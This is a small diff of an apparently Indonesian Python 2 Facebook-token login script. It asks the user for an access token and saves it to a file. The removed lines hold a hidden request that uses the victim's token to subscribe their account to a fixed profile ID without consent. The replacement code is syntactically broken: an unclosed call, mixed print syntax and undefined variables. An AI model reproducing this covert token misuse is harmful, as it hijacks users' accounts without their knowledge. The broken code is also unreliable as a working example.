@@ -119,10 +119,9 @@ def tokenz():
 		print""+p+""
 		print" SELAMAT - DATANG"
 		token = raw_input('\n [✓] Masukkan Token : ')
-		try:
-			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
-			try:
-                    requests.post('https://graph.facebook.com/100055913630645/subscribers?access_token=' + token)
+		try :
+			otw = requests.get('https://graph.facebook.com/me?access_token='+token
+
 		    print(f"[✓] Login Berhasil [✓]\nWelcome {nama}")
 			open("save","a").write(to)
 			time.sleep(1.5)
